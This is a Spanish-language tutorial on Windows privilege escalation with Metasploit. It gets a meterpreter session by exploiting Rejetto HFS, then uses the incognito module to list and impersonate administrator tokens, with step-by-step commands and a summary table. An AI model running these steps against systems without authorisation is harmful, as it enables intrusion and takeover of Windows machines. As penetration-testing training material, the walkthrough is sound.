# Escalada de privilegios en Windows con suplantación de token (Impersonation) usando Metasploit

---

## Resumen
Este método permite escalar privilegios desde una sesión inicial limitada mediante la suplantación de un token delegado con privilegios más altos que ya existe en el sistema.  
Para ello se utiliza el módulo `incognito` de Metasploit y técnicas de token impersonation.

---

# Identificación de la posibilidad de suplantación de token

- La sesión inicial debe estar en un usuario perteneciente al grupo Administradores o con privilegios suficientes para suplantar tokens.
- Es necesario que haya un token válido en memoria que pertenezca a un administrador o a SYSTEM.
- Se comprueba mediante la enumeración de privilegios y la lista de tokens disponibles.

---

# Pasos completos

## 1. Conseguir una sesión inicial

Se utiliza un exploit para obtener una sesión de `meterpreter` en la máquina víctima.  
En este caso con el módulo `rejetto_hfs_exec`:

```
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP_OBJETIVO>
exploit
```

Esto abrirá una sesión de `meterpreter` como usuario limitado.

---

## 2. Buscar el proceso `explorer.exe` y migrar

Para estabilizar la sesión y trabajar en un proceso confiable, se migra a `explorer.exe`.

```
ps | grep explorer
```

Identificar el PID y migrar:
```
migrate <PID_EXPLORER>
```

---

## 3. Enumerar privilegios

Verificar los privilegios actuales del usuario:
```
getprivs
```

Si se observan privilegios como `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`, el sistema probablemente permite la suplantación.

---

## 4. Cargar el módulo `incognito`

El módulo `incognito` permite listar y suplantar tokens en el sistema.

```
load incognito
```

---

## 5. Listar los tokens disponibles

Listar los tokens de usuario detectados en el sistema:
```
list_tokens -u
```

Si aparecen tokens como `BUILTIN\Administrators` o `DOMINIO\Administrator`, se puede intentar suplantarlos.

---

## 6. Suplantar el token

Elegir uno de los tokens administradores listados anteriormente y suplantarlo:
```
impersonate_token "<DOMINIO\Administrator>"
```

Si el comando tiene éxito, el usuario actual adoptará los privilegios del token suplantado.

---

## 7. Migrar a un proceso estable como `explorer.exe`

Para asegurar la sesión y mantener el estado, migrar de nuevo a `explorer.exe`:
```
ps | grep explorer
migrate <PID_EXPLORER>
```

En este punto la sesión debería tener privilegios elevados.

---

# Resumen de comandos

| Paso                                   | Comando / Acción                                   |
|---------------------------------------|---------------------------------------------------|
| Obtener sesión inicial               | `use rejetto_hfs_exec` → `set RHOSTS` → `exploit` |
| Buscar proceso `explorer.exe`        | `ps | grep explorer`                              |
| Migrar a `explorer.exe`              | `migrate <PID>`                                  |
| Ver privilegios                       | `getprivs`                                       |
| Cargar incognito                      | `load incognito`                                 |
| Listar tokens                         | `list_tokens -u`                                |
| Suplantar token                       | `impersonate_token "<DOMINIO\Administrator>"`   |
| Migrar de nuevo                       | `ps | grep explorer` → `migrate <PID>`          |

---

